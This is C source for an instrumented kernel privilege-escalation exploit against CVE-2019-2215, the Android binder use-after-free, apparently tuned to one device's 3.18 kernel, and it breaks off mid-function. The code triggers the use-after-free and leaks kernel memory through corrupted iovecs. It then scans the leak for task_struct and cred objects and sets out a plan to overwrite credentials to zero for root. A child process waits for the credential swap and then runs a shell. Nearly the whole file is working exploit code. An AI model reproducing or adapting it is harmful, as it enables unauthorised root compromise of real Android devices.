#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <ctype.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <grp.h>
#include <sys/syscall.h>
#include <sched.h>

/* CVE-2019-2215 stage 1 (leak) for Xplay6 / msm8996 3.18.20, instrumented.
 *
 * Constants measured on our own Image (art/ledger-20261013.md S32):
 *   sizeof(binder_thread)=0x128 -> kmalloc-512; 25*sizeof(iovec)=400 -> kmalloc-512
 *   thread->wait = +0x48 -> slot 0x48 = wait.lock = iovec[4].iov_len
 *                        -> slot 0x50 = wait.head.next = iovec[5].iov_base
 *                        -> slot 0x58 = wait.head.prev = iovec[5].iov_len
 *   arm64 3.18 ticket spinlock idle value after lock+unlock = 0x10001
 *
 * Instrumentation: every iovec entry reads from its OWN marked block, so the byte
 * values in the delivered pipe stream identify which entry the kernel was
 * copying when. Any byte that is not a marker = kernel data = the leak.
 */
#define PAGE          0x1000
#define UAF_SPINLOCK  0x10001UL
#define IOVEC_ARRAY_SZ   25
#define WAITQUEUE_OFFSET 0x48
#define WQ              (WAITQUEUE_OFFSET / 16)
#define BINDER_THREAD_EXIT 0x40046208u

#define BLK           0x11000        /* per-entry block: big enough for 0x10001 reads */
#define TX_MAP        (1 << 20)      /* binder mmap region for the outgoing parcel */
#define MARK(j)       (0x10 + (j))

/* uapi (drivers/staging/android/uapi/binder.h of this very tree) */
typedef uint64_t binder_size_t;
typedef uint64_t binder_uintptr_t;
struct binder_transaction_data {
    union { uint32_t handle; binder_uintptr_t ptr; } target;
    binder_uintptr_t cookie;
    uint32_t code;
    uint32_t flags;
    int32_t  sender_pid;
    uint32_t sender_euid;
    binder_size_t data_size;
    binder_size_t offsets_size;
    union { struct { binder_uintptr_t buffer; binder_uintptr_t offsets; } ptr; uint8_t buf[8]; } data;
};
struct binder_write_read {
    binder_size_t write_size;
    binder_size_t write_consumed;
    binder_uintptr_t write_buffer;
    binder_size_t read_size;
    binder_size_t read_consumed;
    binder_uintptr_t read_buffer;
};
#define BINDER_WRITE_READ        _IOWR('b', 1, struct binder_write_read)
#define BC_TRANSACTION           _IOW('c', 0, struct binder_transaction_data)

static void pin0(void) {
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(0, &s);
    sched_setaffinity(0, sizeof s, &s);
}

static ssize_t read_loop(int fd, char *buf, size_t cap) {
    size_t got = 0;
    int verbose = getenv("VERBOSE") != NULL;
    while (got < cap) {
        ssize_t n = read(fd, buf + got, cap - got);
        if (n < 0) { if (errno == EINTR) continue; perror("read"); break; }
        if (n == 0) break;
        got += n;
        /* one line per 4 KiB chunk is thousands of write()s per round and dominated the round time;
         * the delivered total is what matters and it is printed by the caller */
        if (verbose)
            printf("    read: +%zd got=%zu\n", n, got);
    }
    return got;
}

static ssize_t write_loop(int fd, const char *buf, size_t len) {
    size_t done = 0;
    int verbose = getenv("VERBOSE") != NULL;
    while (done < len) {
        ssize_t n = write(fd, buf + done, len - done);
        if (n < 0) { if (errno == EINTR) continue; perror("write"); break; }
        done += n;
        if (verbose)
            printf("    fwd: +%zd done=%zu\n", n, done);
    }
    return done;
}

/* binder_poll() only registers the epoll wait entry on &thread->wait when
 * wait_for_proc_work is false, i.e. when thread->transaction_stack != NULL ||
 * !list_empty(&thread->todo) || thread->return_error != BR_OK.  An idle client
 * thread otherwise lands on &proc->wait, which is never freed here -- that is why
 * the first attempts corrupted nothing.  A BC_TRANSACTION to a nonexistent handle
 * runs binder_transaction()'s shared error tail:
 *     BUG_ON(thread->return_error != BR_OK);
 *     thread->return_error = return_error;          (BR_DEAD_REPLY / -ENOSPC)
 * which leaves transaction_stack == NULL, so binder_free_thread()'s transaction
 * walk (and its BUG()) is never entered and kfree(thread) is unconditional.
 */
static void probe_bc(int unused_fd)
{
    char payload[8] = { 0 };
    struct binder_transaction_data tr;
    struct binder_write_read bwr;
    char wbuf[4 + 128];
    unsigned int s;
    int fd, rc;
    uint32_t cmd;

    (void)unused_fd;
    memset(&tr, 0, sizeof tr);
    tr.target.handle = 0x1337;
    tr.data_size = sizeof payload;
    tr.data.ptr.buffer = (binder_uintptr_t)(uintptr_t)payload;

    /* Positive control: BC_ENTER_LOOPER = _IO('c',12) = 0x630c was read out of
     * binder_thread_write()'s own compare constants, so it must be accepted. */
    cmd = 0x630c;
    fd = open("/dev/binder", O_RDONLY);
    memset(wbuf, 0, sizeof wbuf);
    memcpy(wbuf, &cmd, 4);
    memset(&bwr, 0, sizeof bwr);
    bwr.write_size = 4;
    bwr.write_buffer = (binder_uintptr_t)(uintptr_t)wbuf;
    errno = 0;
    rc = ioctl(fd, BINDER_WRITE_READ, &bwr);
    printf("  positive control BC_ENTER_LOOPER(0x630c): rc=%d errno=%d consumed=%llu\n",
           rc, errno, (unsigned long long)bwr.write_consumed);
    close(fd);

    printf("  probing driver's sizeof(binder_transaction_data) via BC_TRANSACTION nr=0,type='c'\n");
    for (s = 8; s <= 128; s += 8) {
        cmd = (1u << 30) | (s << 16) | ((uint32_t)'c' << 8) | 0;
        fd = open("/dev/binder", O_RDONLY);
        memset(wbuf, 0, sizeof wbuf);
        memcpy(wbuf, &cmd, 4);
        memcpy(wbuf + 4, &tr, sizeof tr < s ? sizeof tr : (size_t)s);
        memset(&bwr, 0, sizeof bwr);
        bwr.write_size = 4 + s;
        bwr.write_buffer = (binder_uintptr_t)(uintptr_t)wbuf;
        errno = 0;
        rc = ioctl(fd, BINDER_WRITE_READ, &bwr);
        printf("    size=%3u cmd=%08x rc=%d errno=%d consumed=%llu%s\n", s, cmd, rc, errno,
               (unsigned long long)bwr.write_consumed,
               (rc == 0 || errno != EINVAL) ? "   <== RECOGNISED" : "");
        close(fd);
    }
}

/* binder_poll()'s control flow, read out of OUR binary (binder_poll @ ffffffc0009f5404):
 *   thread = binder_get_thread(proc)
 *   wait_for_proc_work = thread->transaction_stack == NULL        ([thread+0x28])
 *                     && list_empty(&thread->todo)                ([thread+0x30])
 *                     && thread->return_error == BR_OK             ([thread+0x40], 0x7201)
 *   if (wait_for_proc_work) { if (has_proc_work) return POLLIN;  poll_wait(filp, proc+0xd0) }
 *   else                    { if (has_thread_work) return POLLIN; poll_wait(filp, thread+0x48) }
 * So the epoll entry only lands on &thread->wait -- the object BINDER_THREAD_EXIT
 * frees -- when the todo list is empty AND return_error is BR_OK AND
 * transaction_stack is non-NULL with to_proc set, i.e. exactly one outstanding
 * synchronous transaction awaiting its reply.  (return_error != BR_OK, my first
 * idea, also makes binder_has_thread_work() true, so poll_wait is skipped.)
 * Sending to handle 0 uses the global context-manager node, so no peer setup is
 * needed; binder_free_thread() clears t->from, so the late reply takes the
 * BR_DEAD_REPLY path instead of touching the freed thread.
 */
static int arm_pending_tx(int fd, void *map)
{
    char wbuf[4 + sizeof(struct binder_transaction_data)];
    char payload[16];
    struct binder_transaction_data tr;
    struct binder_write_read bwr;
    uint32_t cmd = BC_TRANSACTION;
    int rc;

    (void)map;
    memset(payload, 0, sizeof payload);
    memset(&tr, 0, sizeof tr);
    tr.target.handle = 0;                    /* the context manager */
    tr.code = 2;                             /* check_service */
    tr.flags = 0;                            /* synchronous -> transaction_stack stays */
    tr.data_size = sizeof payload;
    tr.offsets_size = 0;
    tr.data.ptr.buffer = (binder_uintptr_t)(uintptr_t)payload;   /* read from user heap */

    memcpy(wbuf, &cmd, 4);
    memcpy(wbuf + 4, &tr, sizeof tr);
    memset(&bwr, 0, sizeof bwr);
    bwr.write_size = sizeof wbuf;
    bwr.write_buffer = (binder_uintptr_t)(uintptr_t)wbuf;
    errno = 0;
    rc = ioctl(fd, BINDER_WRITE_READ, &bwr);
    printf("  arm tx: rc=%d errno=%d wconsumed=%llu\n", rc, errno,
           (unsigned long long)bwr.write_consumed);
    if (rc)
        return rc;

    /* binder_transaction() queues a BINDER_WORK_TRANSACTION_COMPLETE into the
     * *sender's* todo for every transaction, so right after the send
     * binder_has_thread_work() is true and poll_wait() would be skipped.  Reading
     * now consumes that BR_TRANSACTION_COMPLETE (and clears
     * BINDER_LOOPER_STATE_NEED_RETURN, the third term of has_thread_work), leaving
     * the only state that registers on &thread->wait: empty todo + non-NULL
     * transaction_stack.  If the reply got here first we lost the race and the
     * read returns BR_REPLY instead -- that round is then reported as unusable. */
    /* Read until the queued BR_TRANSACTION_COMPLETE (0x7206) has been consumed.
     * The first read on a fresh thread returns BR_NOOP (0x720c) because
     * BINDER_LOOPER_STATE_NEED_RETURN is set, and it stops there -- so one read is
     * not enough.  After the complete is gone the todo is empty while
     * transaction_stack is still set, which is the only state where
     * binder_poll() calls poll_wait() on &thread->wait. */
    /* Read until the queued BR_TRANSACTION_COMPLETE (0x7206) has been consumed but
     * WITHOUT eating a BR_REPLY that may have landed in the same batch: after a
     * complete-only read the thread is in the only state where binder_poll() calls
     * poll_wait() on &thread->wait (todo empty, transaction_stack set,
     * return_error BR_OK, NEED_RETURN cleared by this very read).  A first read on a
     * fresh thread also emits BR_NOOP (0x720c) for NEED_RETURN and then keeps
     * walking the todo in the same syscall, so both can arrive in one batch -- hence
     * parse the stream instead of looking at the first dword only. */
    {
        int attempt_no;
        for (attempt_no = 0; attempt_no < 3; attempt_no++) {
            char rbuf[256];
            struct binder_write_read bwr2;
            size_t off = 0;
            int got_complete = 0, got_reply = 0;

            memset(rbuf, 0, sizeof rbuf);
            memset(&bwr2, 0, sizeof bwr2);
            bwr2.read_size = sizeof rbuf;
            bwr2.read_buffer = (binder_uintptr_t)(uintptr_t)rbuf;
            errno = 0;
            rc = ioctl(fd, BINDER_WRITE_READ, &bwr2);
            off = 0;
            while (off + 4 <= (size_t)bwr2.read_consumed) {
                uint32_t cmd;
                memcpy(&cmd, rbuf + off, 4);
                off += 4;
                if (cmd == 0x7206)
                    got_complete = 1;
                else if (cmd == 0x80407203 || cmd == 0x80407202) {
                    got_reply = 1;
                    off += 64;
                }
            }
            printf("  drain %d: rc=%d errno=%d rconsumed=%llu complete=%d reply=%d\n",
                   attempt_no, rc, errno, (unsigned long long)bwr2.read_consumed,
                   got_complete, got_reply);
            if (rc)
                return rc;
            if (got_complete && !got_reply)
                return 0;          /* ideal state: ADD right now */
            if (got_reply)
                return -1;         /* reply already consumed -> stack cleared */
        }
        return -1;
    }
}

/* Ground truth on whether BINDER_THREAD_EXIT really returned our binder_thread to
 * the allocator: the driver's own debugfs node lists the live threads. */
static void dump_threads(const char *tag)
{
    char path[64], buf[8192];
    ssize_t n;
    char *p;
    int fd, shown = 0;

    snprintf(path, sizeof path, "/sys/kernel/debug/binder/proc/%d", getpid());
    fd = open(path, O_RDONLY);
    if (fd < 0) { printf("  [%s] debugfs open failed: %s\n", tag, strerror(errno)); return; }
    n = read(fd, buf, sizeof buf - 1);
    close(fd);
    if (n <= 0) { printf("  [%s] debugfs read -> %zd\n", tag, n); return; }
    buf[n] = 0;
    printf("  [%s] %zd bytes:\n", tag, n);
    p = buf;
    while (*p && shown < 24) {
        char *e = strchr(p, '\n');
        if (e) *e = 0;
        if (strstr(p, "thread") || strstr(p, "transaction") || strstr(p, "pending") ||
            strstr(p, "await") || strstr(p, "proc ")) {
            printf("     %s\n", p);
            shown++;
        }
        if (!e) break;
        p = e + 1;
    }
}

/* The delivered stream is self-describing: remove_wait_queue's __list_del wrote
 * slot+0x50 into BOTH iov[5].iov_base and iov[5].iov_len of the kernel's copy of
 * my array, and the copy's SOURCE address is that iov_base value.  So the first
 * two words of the window equal the window's own source address, which yields the
 * absolute VA of my slot -- and therefore of every 512-byte neighbour, free or not.
 * Requires: v == next word, v inside the linear map, and (v - 0x50) 512-aligned.
 * This is the ONE criterion implementation: report_window() and the needle finder
 * both call it, so a scan cannot report a VA the window locator would reject. */
static int find_pair(const char *stream, size_t got, size_t *wout, unsigned long *sout)
{
    size_t i;

    /* Byte-aligned on purpose: the window's start offset inside the stream is
     * 0x1000 + <corrupted lock length> = 0x11001, i.e. ODD, so an 8-aligned scan
     * finds nothing and reads as "no leak" (bit me once already, ledger 89). */
    for (i = 0; i + 16 <= got; i++) {
        unsigned long a, b;
        memcpy(&a, stream + i, 8);
        memcpy(&b, stream + i + 8, 8);
        if (a == b && a >= 0xffffffc000000000UL && a < 0xffffffd000000000UL &&
            (a - 0x50UL) % 512 == 0) {
            *wout = i;
            *sout = a;
            return 0;
        }
    }
    return -1;
}

/* FIND: locate an ASCII needle in the leaked span and print its KERNEL VA.
 * The VA is only meaningful once the window anchor is known, so no anchor -> no claim.
 * PCTRL is the ruler's own positive control: a needle planted in MY user block, which
 * must be found -- otherwise a pile of 0 hits means the finder is blind, not that the
 * kernel has no such object (same lesson as the coverage gates in the port line). */
static void find_needle(const char *stream, size_t got, const char *needle,
                        unsigned long anchor_va, size_t anchor_off, const char *tag)
{
    size_t len = strlen(needle), h = 0, hits = 0;

    if (!anchor_va) {
        printf("  FIND[%s]: no window anchor -> cannot name a VA, skipping\n", tag);
        return;
    }
    while (len && h + len <= got) {
        const char *p = memchr(stream + h, needle[0], got - h - len + 1);
        if (!p)
            break;
        h = (size_t)(p - stream);
        if (!memcmp(p, needle, len)) {
            long delta = (long)h - (long)anchor_off;
            printf("  FIND[%s] \"%s\" at stream+%zu -> VA %#lx%s\n", tag, needle, h,
                   (unsigned long)((long)anchor_va + delta),
                   h < anchor_off ? "  (BEFORE anchor: user block)" : "");
            {
                size_t q;
                for (q = (h > 0x40 ? h - 0x40 : 0); q + 8 <= h + 0x60 && q + 8 <= got; q += 8)
                    if ((q & 0x38) == 0) {
                        unsigned long v;
                        memcpy(&v, stream + q, 8);
                        printf("      +%03ld %#018lx\n", (long)q - (long)h, v);
                    }
            }
            hits++;
            if (hits >= 8)
                break;
        }
        h++;
    }
    printf("  FIND[%s] \"%s\": %zu hit(s)\n", tag, needle, hits);
}

/* Look for task_structs inside the window WITHOUT guessing any address:
 * a plausible comm (printable, <=15 chars, NUL-terminated) at offset O makes base = O - 0xac8
 * (offsetof comm, proven twice in the Image: __set_task_comm / get_task_comm), and the same
 * object must then carry our own pid at base + 0x490 (offsetof pid, proven by binder_get_thread's
 * `t->pid = current->[+0x490]`).  Reporting cred/real_cred for every such task lets the SHARED
 * value among kernel workers single out the root cred -- no fingerprinting of .data required. */
/* Offsets witnessed from NAMED functions of the 7.1.1 Image -- see art/task_offsets-7.tsv
 * (tools/task_offsets_7.py re-decodes every site and refuses to publish a stale row):
 *   task->comm       = +0xac8  (__set_task_comm+0xc: add x21,x0,#0xac8 -- the only writer)
 *   task->cred       = +0x4c0  (override_creds+0x1c, exit_creds+0x10)
 *   task->real_cred  = +0x658  (get_task_cred+0x18, exit_creds+0x18, proc_pid_status+0x428)
 *   cred ids         = +0x4 .. +0x20 (uid gid euid egid suid sgid fsuid fsgid)
 *   cred caps        = +0x28 +0x30 +0x38 +0x40 (inheritable permitted effective bset)
 * §475's "real_cred=+0x4b8" was wrong; the old hunt used it and therefore never matched.
 */
#define TASK_COMM      0xac8
#define TASK_CRED      0x4c0
#define TASK_REALCRED  0x658
#define TASK_PRIO      0x54     /* int; binder_open+0xdc `ldr w20,[x0,#0x54]` then -120 */
#define PROC_PID       0x30
#define PROC_TSK       0x48     /* binder_open+0xa8 `str x0,[x19,#0x48]` (x0 = thread_info->task) */
#define PROC_DEFPRIO   0x1d0    /* binder_open+0xe8 `str x20,[x19,#0x1d0]` (= task_nice) */
#define TASK_PID       0x490     /* binder_get_thread+0x40 `ldr w4,[x3,#0x490]` = current->pid */
#define LIN_LO   0xffffff8000000000UL   /* PAGE_OFFSET for VA_BITS=39 */
#define LIN_HI   0xffffffc000000000UL
#define KRN_LO   0xffffffc000000000UL
#define KRN_HI   0xffffffd000000000UL

static int plaus_lin(unsigned long v) { return v >= LIN_LO && v < LIN_HI; }
static int plaus_krn(unsigned long v) { return v >= KRN_LO && v < KRN_HI; }

/* The identity channel is getpriority(PRIO_PROCESS,0): the kernel computes it as
 * task_nice(current) = current->static_prio - 120, i.e. a direct read through a syscall of the very
 * field the driver writes (+0x54, witnessed in binder_open).  A second, independent face of the
 * same number is `ps -o ni` taken by the driver from *outside*, which goes through procfs for
 * another task.  We deliberately do not parse /proc/self/stat here: this kernel's column numbering
 * differs from the man page (measured: with nice 7 the row reads "... 153 27 7 1 0 ...", where 27 is
 * the scheduler priority), and a by-space tokenizer that miscounts by one turns the witness into a
 * blind ruler.  Numbers of that kind are toybox's job, not ours. */
static long self_nice(void) { return (long)getpriority(PRIO_PROCESS, 0); }

/* Published by scan_sigs once the binder_proc candidates agree, consumed by read_target() on later
 * rounds: the needle names the task in one window and a later window reads it. */
static unsigned long g_taskva;

/* (pid, planted nice) pairs we own.  One entry per child of ours that opened binder fds with its
 * own nice: the acceptance test becomes "does this candidate carry one of OUR pairs", which is what
 * lets a single run name dozens of tasks at once.  That matters because the read channel below is
 * a coverage game -- the window is 8 MB and the heap band is ~1.4 GB wide, so one named task is
 * hit rarely, while task_structs of our own children sit in a few dense slab pages. */
static struct { unsigned int pid; long nice; } g_plant[64];
static int nplant;

/* What the needle has named so far, with the binder_proc candidates agreeing on each. */
static struct { unsigned long tsk; unsigned int pid; unsigned long cand[8]; int n; } seen[48];
static int nseen;

/* What the needle hunts for: (pid, task_nice) pairs that only OUR chosen process's binder_procs
 * carry.  Defaults to this process; WCHILD makes it a child forked HERE (while still uid 2000) so
 * that the patched task never has to fork -- measured: a task whose cred was redirected to
 * init_cred dies at its first clone()/setresuid(), i.e. at the first operation that copies a cred,
 * while it is alive and readable otherwise (ledger 491).  execve is the operation the delivery
 * actually needs, so the child gets patched and does the exec. */
static unsigned int g_wantpid;
static long g_wantnice;

static void onsig(int s)
{
    printf("  SIGNAL %d caught (uid=%d) -- this is a userspace fault or a catchable kill, not SIGKILL\n",
           s, (int)getuid());
    fflush(stdout);
    _exit(80 + s);
}

static void install_signal_witness(void)
{
    static const int sigs[] = { SIGSEGV, SIGBUS, SIGILL, SIGTRAP, SIGABRT, SIGFPE,
                                SIGPIPE, SIGTERM, SIGHUP, SIGINT, SIGQUIT };
    struct sigaction sa;
    size_t k;

    memset(&sa, 0, sizeof sa);
    sa.sa_handler = onsig;
    sigemptyset(&sa.sa_mask);
    for (k = 0; k < sizeof sigs / sizeof sigs[0]; k++)
        sigaction(sigs[k], &sa, NULL);
}

static const char *WFILE = "/data/local/tmp/wexec.txt";
static int wfd = -1;

/* Write one line into the witness file with a *cached* fd: the fd was opened by this task while it
 * was still uid 2000, so a write through it does no path lookup and no new permission decision.
 * That distinction is the point -- the child has twice vanished with exit status 0 and no line
 * within 2 s of the cred swap, and the only syscalls it had entered were open()/write() on a fresh
 * path.  Markers are written BEFORE each action, so the last marker names the action it died in. */
static void wline(const char *tag, int v)
{
    char buf[200];
    int n;

    if (wfd < 0)
        return;
    n = snprintf(buf, sizeof buf, "%s pid=%d uid=%d euid=%d gid=%d nice=%ld v=%d\n", tag,
                 (int)getpid(), (int)getuid(), (int)geteuid(), (int)getgid(), self_nice(), v);
    if (n > 0)
        (void)!write(wfd, buf, (size_t)n);
}

/* The witness child: forked by the still-unprivileged parent, plants its OWN nice, opens binder
 * fds so its procs carry (its pid, its nice) for the needle, and then does nothing but watch its
 * own getuid() and execve once that changes.  Nothing here is done by a rooted task. */
static void witness_child(long kid_nice)
{
    pid_t c = fork();

    if (c == 0) {
        int i, rc, sfd;
        long churn = getenv("CHURN") ? atol(getenv("CHURN")) : 0;
        long sbmark = getenv("SBMARK") ? atol(getenv("SBMARK")) : 0x40;
        char buf[8] = { 0 };

        setpriority(PRIO_PROCESS, 0, (int)kid_nice);
        for (i = 0; i < 4; i++)
            if (open("/dev/binder", O_RDONLY) < 0)
                break;
        printf("  WCHILD pid=%d nice=%ld getpriority=%ld binder procs opened\n", (int)getpid(),
               kid_nice, self_nice());
        fflush(stdout);
        wfd = open(WFILE, O_WRONLY | O_CREAT | O_APPEND, 0666);
        /* THE READ CHANNEL.  proc_pid_status() prints Uid/Gid/CapInh/CapPrm/CapEff/CapBnd out of
         * whatever `task->real_cred` points at (witnessed: proc_pid_status+0x428 `ldr x0,[x20,#0x658]`),
         * so a single 8-byte write of `real_cred` turns our own /proc/self/status into a window onto
         * ~72 chosen kernel bytes: Uid = +0x04..+0x14, Gid = +0x14..+0x24, then the four cap words.
         * The fd is opened NOW, while this task is still an ordinary shell task, because a patched
         * task dies on path-lookup opens (ladder, ledger 491); read()+lseek() on an already open fd
         * is the face that survives. */
        sfd = open("/proc/self/status", O_RDONLY);
        if (sfd < 0)
            printf("  WCHILD cannot open /proc/self/status errno=%d\n", errno);
        if (wfd < 0)
            printf("  WCHILD cannot open %s errno=%d\n", WFILE, errno);
        /* Every reading below goes through a raw file, not stdio: the first WCHILD after the swap
         * disappeared with exit status 0 and left no line in the parent's log, which cannot be
         * told apart from "stdio died" unless the witness is written with open/write directly. */
        for (i = 0; i < 400; i++) {
            /* Keep allocating binder_procs while the parent leaks: one batch at fork time is not
             * enough, because the window is the neighbourhood of the slot the parent just freed on
             * CPU0, and only the procs allocated close in time to a round land in it (measured:
             * with 4 procs opened once, 10 rounds accepted 0 candidates). */
            /* getuid() FIRST: measured, the last marker of a patched child was
             * "enter-binder-open ... uid=0" and nothing after it -- `open("/dev/binder")` is the
             * syscall that kills a task whose cred is init_cred (fork and setresuid did the same to
             * the parent in earlier runs).  So once the swap is seen, the only thing left to do is
             * the execve the whole chain exists to test; no more binder opens, ever. */
            wline("enter-getuid", i);
            /* Two ways the patch announces itself.  getuid() covers the root case; the securebits
             * word covers the *non-root* probe cred we also build (ledger 492's question "is the
             * killer the uid or the sid?" needs a task whose uid stays 2000), and
             * prctl(PR_GET_SECUREBITS) is a plain load of cred->securebits -- no pointer deref, so
             * it is safe to poll even while cred points at a crafted object. */
            if (getuid() != 2000 || prctl(PR_GET_SECUREBITS, 0, 0, 0, 0) == sbmark) {
                printf("  patch seen: uid=%d securebits=%d\n", (int)getuid(),
                       (int)prctl(PR_GET_SECUREBITS, 0, 0, 0, 0));
                break;
            }
            /* CHURN=n allocates n fresh creds NOW (prepare_creds on every set*id call), because the
             * template hunt found 0 cred-shaped objects in an 8 MB window when our cred was created
             * back at execve -- a hot page is the only reason one might show up at all. */
            if (churn) {
                int z;

                for (z = 0; z < churn; z++) {
                    (void)!setuid(getuid());
                    (void)!setgid(getgid());
                    (void)!setresuid(-1, -1, -1);
                }
            }
            wline("poll", i);
            if (sfd >= 0) {
                char sb[1024];
                ssize_t n;

                (void)!lseek(sfd, 0, SEEK_SET);
                n = read(sfd, sb, sizeof sb - 1);
                if (n > 0) {
                    sb[n] = 0;
                    if (wfd >= 0) {
                        (void)!write(wfd, "STATUS_BEGIN\n", 13);
                        (void)!write(wfd, sb, (size_t)n);
                        (void)!write(wfd, "STATUS_END\n", 11);
                    }
                }
            }
            if (i < 40) {
                int z;

                for (z = 0; z < 2; z++)
                    if (open("/dev/binder", O_RDONLY) < 0)
                        break;
            }
            sleep(2);
        }
        wline("broken", 1);
        /* Map of what a uid-0 / scontext=u:r:kernel:s0 task may still do, pathless operations
         * first and destructive ones last, each entry marked BEFORE the call so the last marker
         * names the syscall that killed it.  Where that boundary falls is the lead for finding the
         * killer in the Image: a boundary at the first path lookup points at do_filp_open/path_openat,
         * one at exec points somewhere else. */
        {
            int fd2, sv[2], r;
            void *m;
            char pb[8];
            struct stat st;
            struct timeval tv;

            wline("L-getppid", (int)getppid());
            wline("L-umask", (int)umask(022));
            wline("L-gettimeofday", 0);
            (void)!gettimeofday(&tv, NULL);
            wline("L-mmap", 0);
            m = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            wline("L-mmap-rc", m == MAP_FAILED ? -1 : 0);
            if (m != MAP_FAILED)
                munmap(m, 0x1000);
            wline("L-pipe2", 0);
            sv[0] = sv[1] = -1;
            r = pipe2(sv, 0);
            wline("L-pipe2-rc", r);
            if (r == 0) {
                wline("L-pipe-write", 0);
                (void)!write(sv[1], "z", 1);
                (void)!read(sv[0], pb, 1);
                close(sv[0]);
                close(sv[1]);
            }
            wline("L-fstat-fd1", 0);
            r = fstat(1, &st);
            wline("L-fstat-fd1-rc", r == 0 ? (int)st.st_uid : -1);
            wline("L-stat-path", 0);
            r = stat("/dev/null", &st);
            wline("L-stat-path-rc", r);
            wline("L-open-devnull", 0);
            fd2 = open("/dev/null", O_RDWR);
            wline("L-open-devnull-rc", fd2);
            if (fd2 >= 0)
                close(fd2);
            wline("L-open-proc-self", 0);
            fd2 = open("/proc/self/cmdline", O_RDONLY);
            wline("L-open-proc-self-rc", fd2);
            if (fd2 >= 0)
                close(fd2);
        }
        wline("pre-execl", (int)getuid());
        execl("/system/bin/sh", "sh", "-c",
              "W=/data/local/tmp/wexec.txt; { echo EXEC uid=$(id -u) gid=$(id -g) egid=$(id -eg); "
              "grep -m1 CapEff /proc/self/status; grep -m1 SecId /proc/self/status; "
              "ls -ld /proc/$$; ls -Zd /proc/$$; } >> $W 2>&1; chmod 666 $W; "
              "echo WEXEC uid=$(id -u) cap=$(grep -m1 CapEff /proc/self/status)",
              (char *)0);
        wline("execl-FAILED", errno);
        _exit(126);
    }
    if (c < 0) {
        printf("  WCHILD fork failed errno=%d\n", errno);
        return;
    }
    printf("  WCHILD: forked uid-2000 witness child pid=%d nice=%ld\n", (int)c, kid_nice);
    fflush(stdout);
    if (nplant < 64) {
        g_plant[nplant].pid = (unsigned int)c;
        g_plant[nplant].nice = kid_nice;
        nplant++;
    }
    g_wantpid = (unsigned int)c;
    g_wantnice = kid_nice;
}

/* Read the leaked window for task_struct objects.  Identity rule (ledger 476): a bare
 * string is never enough -- a hit counts only when comm decodes AND both cred slots hold
 * plausible pointers.  With SPRAY the children are each named with a distinct tag, so a hit
 * also tells us WHICH task we can reach; that task's cred is shared with all of them (fork
 * does get_cred, not copy_creds) so one cred patch roots the whole tree of OUR exec'd
 * process -- and nothing outside it. */
static void hunt_tasks(const char *stream, size_t got, unsigned long anchor_va, size_t anchor_off)
{
    size_t o;
    int shown = 0, hits = 0, names = 0, cand = 0;
    const char *tag = getenv("TAG");

    if (!anchor_va)
        return;
    if (!tag || !*tag)
        tag = "XPL";
    for (o = anchor_off + TASK_COMM; o + 16 <= got; o += 1) {
        unsigned char c = (unsigned char)stream[o];
        char comm[17];
        size_t len = 0;
        long bo;
        unsigned long base, cr, rc;

        if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z')))
            continue;
        while (len < 16 && (unsigned char)stream[o + len] >= 0x20 &&
               (unsigned char)stream[o + len] < 0x7f)
            len++;
        if (len == 0 || len > 15 || (unsigned char)stream[o + len] != 0)
            continue;
        memcpy(comm, stream + o, len);
        comm[len] = 0;
        bo = (long)o - TASK_COMM - (long)anchor_off;    /* task base as index into stream */
        if (bo < 0 || bo + TASK_REALCRED + 8 > (long)got)
            continue;
        names++;
        memcpy(&cr, stream + bo + TASK_CRED, 8);
        memcpy(&rc, stream + bo + TASK_REALCRED, 8);
        if (!plaus_krn(cr) || !plaus_krn(rc))
            continue;
        base = anchor_va + bo;
        cand++;
        if (strncmp(comm, tag, strlen(tag)) == 0)
            hits++;
        if (++shown <= 24 || strncmp(comm, tag, strlen(tag)) == 0) {
            printf("  TASK %-16s base=%#lx cred=%#lx real_cred=%#lx%s%s\n",
                   comm, base, cr, rc,
                   cr == rc ? " (cred==real_cred)" : "",
                   strncmp(comm, tag, strlen(tag)) == 0 ? "   <== OUR SPRAY" : "");
            if (strncmp(comm, tag, strlen(tag)) == 0)
                printf("    PATCH PLAN cred=%#lx: 32B zeros at +%#x..%#x, 32B ones at +%#x..%#x\n",
                       cr, 0x4u, 0x24u, 0x28u, 0x48u);
        }
    }
    printf("  hunt_tasks: %d printable-16 runs, %d with two plausible cred pointers, "
           "%d tagged '%s' (printed %d)\n", names, cand, hits, tag, shown);
}


/* The task-shape hunt is NOT discriminating (this round measured 4398 printable-16 runs and
 * 14 "plausible" ones like "rMetadata"/"t ref table" -- random ASCII with pointer-looking
 * words).  So find the CRED by its content instead, and calibrate the content from ourselves:
 * proc_pid_status prints Uid/Gid (8 x u32 at cred+0x4..0x24) and CapInh/CapPrm/CapEff/CapBnd
 * (4 x u64 at cred+0x28..0x48) out of exactly those bytes, so /proc/self/status IS a
 * description of the object we are looking for.  A 64-byte template taken from our own
 * status is sharp enough that a match is a cred of a process with our ids and caps -- and
 * whether that process is US is then decided by the write's own witness (our getuid()),
 * not by guessing. */
struct cred_tmpl {
    unsigned int ids[8];
    unsigned long caps[4];
    int have_ids, have_caps;
};

static int read_tmpl(struct cred_tmpl *t)
{
    char buf[4096], *ln;
    int fd, n;

    memset(t, 0, sizeof *t);
    fd = open("/proc/self/status", O_RDONLY);
    if (fd < 0)
        return -1;
    n = read(fd, buf, sizeof buf - 1);
    close(fd);
    if (n <= 0)
        return -1;
    buf[n] = 0;
    for (ln = strtok(buf, "\n"); ln; ln = strtok(NULL, "\n")) {
        if (!strncmp(ln, "Uid:", 4)) {
            sscanf(strchr(ln, ':') + 1, "%u %u %u %u",
                   &t->ids[0], &t->ids[2], &t->ids[4], &t->ids[6]);
            /* interleaved order in struct cred: uid gid euid egid suid sgid fsuid fsgid */
            t->have_ids = 1;
        } else if (!strncmp(ln, "Gid:", 4)) {
            sscanf(strchr(ln, ':') + 1, "%u %u %u %u",
                   &t->ids[1], &t->ids[3], &t->ids[5], &t->ids[7]);
